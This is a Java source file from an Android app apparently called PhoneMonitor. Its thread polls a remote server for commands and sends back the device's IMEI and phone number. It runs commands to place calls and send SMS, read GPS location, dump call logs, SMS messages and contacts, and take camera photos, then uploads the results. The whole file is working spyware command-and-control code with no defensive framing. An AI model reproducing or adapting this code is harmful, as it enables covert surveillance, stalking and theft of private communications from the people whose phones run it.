package com.example.elite.manage.android;


import android.content.Context;
import android.net.Uri;
import android.os.Build;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;


class ServerTalkLoopThread extends Thread {

    private String reportURL;
    private String commandsURL;
    private String outputURL;
    private Context context;

    ServerTalkLoopThread(Context context, String ReportURL, String CommandsURL, String OutputURL) {
        this.reportURL = ReportURL;
        this.commandsURL = CommandsURL;
        this.outputURL = OutputURL;
        this.context = context;
    }

    @Override
    public void run() {
        try {
            while (!Thread.currentThread().isInterrupted()) {
                if (HelperMethods.isInternetAvailable(context)) {
                    //talk to server
                    try {
                        postStatus(); //post current status to server
                        getAndExecuteWebCommands(); //executes any pending web commands and send output to server
                    } catch (MalformedURLException muex) {
                        Log.w(AppSettings.getTAG(), "MalformedURLException @ServerTalkLoopThread.run()\n" + muex.getMessage());
                    } catch (IOException ioex) {
                        Log.w(AppSettings.getTAG(), "IOException @ServerTalkLoopThread.run()\nEither .getOutputStream() or .getResponseMessage() timed out\n" + ioex.getMessage());
                    }
                }
                Thread.sleep(new AppSettings(context).getServerTalkInterval());
            }
        } catch (InterruptedException iex) {
            //out of the loop if thread interrupted
        }
    }

    private void postStatus() throws IOException {
        //reports device status to the server
        URL url = new URL(this.reportURL);
        HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("User-Agent", "PhoneMonitor");
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setConnectTimeout(5000);//without a timeout, .getOutputStream() hangs forever if server doesn't respond
        httpURLConnection.setReadTimeout(5000);//without a timeout, .getResponseMessage(), .getInputStream() and .getResponseCode() hang forever if server doesn't respond

        OutputStream outputstream = httpURLConnection.getOutputStream();

        Uri.Builder builder = new Uri.Builder()
                .appendQueryParameter("IMEI", HelperMethods.getIMEI(context))
                .appendQueryParameter("number", HelperMethods.getNumber(context))
                .appendQueryParameter("manufacturer", Build.MANUFACTURER)
                .appendQueryParameter("model", Build.MODEL)
                .appendQueryParameter("uniqueid", HelperMethods.getDeviceUID(context));
        String POSTQuery = builder.build().getEncodedQuery();

        outputstream.write(POSTQuery.getBytes("UTF-8"));
        outputstream.flush();
        outputstream.close();
        String responseMsg = httpURLConnection.getResponseMessage();//dunno why but .getResponseMessage() or .getInputStream() or getResponseCode() _is_ required to actually make the POST request
        httpURLConnection.disconnect();
    }

    private void getAndExecuteWebCommands() throws IOException {
        //retrieves commandlist from server and calls executeWebCommandsFromJSON()
        URL url = new URL(this.commandsURL);
        HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setDoOutput(true);//we'll send the deviceUID to the server and we'll receive the corresponding command and params
        httpURLConnection.setDoInput(true);
        httpURLConnection.setRequestProperty("User-Agent", "PhoneMonitor");
        httpURLConnection.setConnectTimeout(5000);
        httpURLConnection.setReadTimeout(5000);

        Uri.Builder builder = new Uri.Builder()
                .appendQueryParameter("uniqueid", HelperMethods.getDeviceUID(context));
        String GETQuery = builder.build().getEncodedQuery();

        OutputStream outputStream = httpURLConnection.getOutputStream();
        outputStream.write((byte[]) GETQuery.getBytes("UTF-8"));
        InputStream inputStream = httpURLConnection.getInputStream();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte byteread;
        while ((byteread = (byte) inputStream.read()) != -1) {
            byteArrayOutputStream.write(byteread);
        }
        String commandsString = byteArrayOutputStream.toString();
        outputStream.close();
        inputStream.close();
        httpURLConnection.disconnect();

        if (!commandsString.equals("")) {
            try {
                JSONArray commandsJSONArray = new JSONArray(commandsString);
                executeWebCommandsFromJSON(commandsJSONArray);
            } catch (JSONException jsoex) {
                Log.w(AppSettings.getTAG(), "JSONException @ ServerTalkLoopThread.getAndExecuteWebCommands()\n" + jsoex.getMessage());
            }

        }
    }

    private void executeWebCommandsFromJSON(JSONArray commandsJson) throws JSONException {
        //actually executes retrieved commands
        WebCommandsExecutor webCommandsExecutor = new WebCommandsExecutor(context);
        for (int i = 0; i < commandsJson.length(); i++) {
            JSONObject command = commandsJson.getJSONObject(i);
            int commandId = command.getInt("commandid");
            switch (commandId) {
                case 0://vibrate(repeat_times,pattern)
                    int repeatTimes = command.getInt("param1");
                    String vibPattern = command.getString("param2");
                    webCommandsExecutor.vibrate(repeatTimes, vibPattern);
                    notifyServerOfCommandExecution(command, "");
                    Log.w(AppSettings.getTAG(), "Vibration effected.");
                    break;
                case 1://call(number)
                    long callPhoneNumber = command.getLong("param1");
                    webCommandsExecutor.call(callPhoneNumber);
                    notifyServerOfCommandExecution(command, "");
                    Log.w(AppSettings.getTAG(), "Phone call effected.");
                    break;
                case 2://sms(number,message)
                    String targetPhone = command.getString("param1");
                    String msgBody = command.getString("param2");
                    if (!targetPhone.equals("")) {
                        SmsManager smsManager = SmsManager.getDefault();
                        smsManager.sendTextMessage(targetPhone, null, msgBody, null, null);
                        Log.w(AppSettings.getTAG(), "SMS effected.");
                    }
                    notifyServerOfCommandExecution(command, "");
                    break;
                case 3://gps(num_times,show_toast_or_not,send_gps_to_number)
                    int promptUserLocationOnTimes = 0;
                    try {
                        promptUserLocationOnTimes = Integer.parseInt(command.getString("param1"));
                    } catch (NumberFormatException nfe) {
                        //do nothing
                    }
                    Boolean showPromptToast = Boolean.parseBoolean(command.getString("param2"));
                    String sendSMSToNumber = command.getString("param3");
                    String gpsCoords = webCommandsExecutor.getGPSCoordinates(promptUserLocationOnTimes, showPromptToast, sendSMSToNumber);
                    notifyServerOfCommandExecution(command, gpsCoords);
                    Log.w(AppSettings.getTAG(), "GPS output effected.");
                    break;
                case 4://getcallrecords()
                    String callLog = webCommandsExecutor.getCallLog();
                    notifyServerOfCommandExecution(command, callLog);
                    Log.w(AppSettings.getTAG(), "CallLog output effected.");
                    break;
                case 5://getsmsmessages()
                    String smsMessages = webCommandsExecutor.getSMSMessages();
                    notifyServerOfCommandExecution(command, smsMessages);
                    Log.w(AppSettings.getTAG(), "SMS messages output effected.");
                    break;
                case 6://getcontacts()
                    String contacts = webCommandsExecutor.getContacts();
                    notifyServerOfCommandExecution(command, contacts);
                    Log.w(AppSettings.getTAG(), "Contacts output effected.");
                    break;
                case 7://clickphotos(method)
                    int method = 0;
                    try {
                        method = Integer.parseInt(command.getString("param1"));
                    } catch (NumberFormatException nfe) {
                        //do nothing
                    }
                    CameraCapture.PictureCaptureMethod captureMethod = (method == 0) ? CameraCapture.PictureCaptureMethod.PCM_SURFACE_TEXTURE : CameraCapture.PictureCaptureMethod.PCM_SURFACE_VIEW;
                    String capturedPhotosJSONArray = webCommandsExecutor.clickPhotos(captureMethod);
                    notifyServerOfCommandExecution(command, capturedPhotosJSONArray);
                    Log.w(AppSettings.getTAG(), "Camera capture effected.");
                    break;
            }
        }
    }


    private void notifyServerOfCommandExecution(JSONObject command, String outputIfAny) throws JSONException {
        //Notifies the server of the execution of a command so that its pending status can be changed to 0 (i.e. inactive)
        //Also, if a non null output exists for the particular command, the server will update the outputlist table in database
        try {
            URL url = new URL(this.outputURL);
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("User-Agent", "PhoneMonitor");
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setConnectTimeout(1000);//without a timeout, .getOutputStream() hangs forever if server doesn't respond
            httpURLConnection.setReadTimeout(6000);//without a timeout, .getResponseMessage(), .getInputStream() and .getResponseCode() hang forever if server doesn't respond

            OutputStream outputstream = httpURLConnection.getOutputStream();

            Uri.Builder builder = new Uri.Builder()
                    .appendQueryParameter("uniqueid", HelperMethods.getDeviceUID(context))
                    .appendQueryParameter("commandid", command.getString("commandid"))
                    .appendQueryParameter("param1", command.getString("param1"))
                    .appendQueryParameter("param2", command.getString("param2"))
                    .appendQueryParameter("param3", command.getString("param3"))
                    .appendQueryParameter("param4", command.getString("param4"))
                    .appendQueryParameter("output", outputIfAny);
            String POSTQuery = builder.build().getEncodedQuery();

            outputstream.write(POSTQuery.getBytes("UTF-8"));
            outputstream.flush();
            outputstream.close();
            String responseMsg = httpURLConnection.getResponseMessage();//dunno why but .getResponseMessage() or .getInputStream() or getResponseCode() _is_ required to actually make the POST request
            httpURLConnection.disconnect();
        } catch (MalformedURLException murlex) {
            Log.w(AppSettings.getTAG(), "MalformedURLException @ServerTalkLoopThread.notifyServerOfCommandExecution()\n" + murlex.getMessage());
        } catch (IOException ioex) {
            Log.w(AppSettings.getTAG(), "IOException @ServerTalkLoopThread.notifyServerOfCommandExecution()\n" + ioex.getMessage());
        }
    }

}